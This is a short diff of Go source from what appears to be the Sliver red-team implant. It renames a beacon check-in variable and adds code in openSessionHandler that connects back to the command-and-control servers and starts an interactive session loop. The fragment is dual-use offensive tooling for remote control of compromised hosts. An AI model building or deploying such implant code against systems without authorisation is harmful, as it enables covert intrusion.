@@ -186,8 +186,8 @@ func main() {
 	defer func() {
 		abort <- struct{}{}
 	}()
-	nextBeacon := transports.StartBeaconLoop(c2Servers, abort)
-	for beacon := range nextBeacon {
+	beaconGenerator := transports.StartBeaconLoop(c2Servers, abort)
+	for beacon := range beaconGenerator {
 		// {{if .Config.Debug}}
 		log.Printf("Next beacon = %v", beacon)
 		// {{end}}
@@ -246,13 +246,13 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	// {{if .Config.Debug}}
 	log.Printf("Registering beacon with server")
 	// {{end}}
-	nextBeacon := time.Now().Add(beacon.Duration())
+	nextCheckin := time.Now().Add(beacon.Duration())
 	beacon.Send(Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
 		ID:          BeaconID,
 		Interval:    beacon.Interval(),
 		Jitter:      beacon.Jitter(),
 		Register:    RegisterSliver(),
-		NextCheckin: nextBeacon.UTC().Unix(),
+		NextCheckin: nextCheckin.UTC().Unix(),
 	}))
 	beacon.Close()
 	time.Sleep(time.Second)
@@ -266,9 +266,9 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 			break
 		}
 		duration := beacon.Duration()
-		nextBeacon = time.Now().Add(duration)
+		nextCheckin = time.Now().Add(duration)
 		go func() {
-			err := beaconMain(beacon, nextBeacon)
+			err := beaconMain(beacon, nextCheckin)
 			if err != nil {
 				intervalErrors++
 				// {{if .Config.Debug}}
@@ -278,7 +278,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		}()
 
 		// {{if .Config.Debug}}
-		log.Printf("[beacon] sleep until %v", nextBeacon)
+		log.Printf("[beacon] sleep until %v", nextCheckin)
 		// {{end}}
 		time.Sleep(duration)
 	}
@@ -418,9 +418,12 @@ func openSessionHandler(data []byte) {
 		time.Sleep(time.Duration(openSession.Delay))
 	}
 
-	// for _, c2 := range openSession.C2S {
-
-	// }
+	go func() {
+		connection := transports.StartConnectionLoop(openSession.C2S)
+		if connection != nil {
+			sessionMainLoop(connection)
+		}
+	}()
 }
 
 // {{end}} -IsBeacon
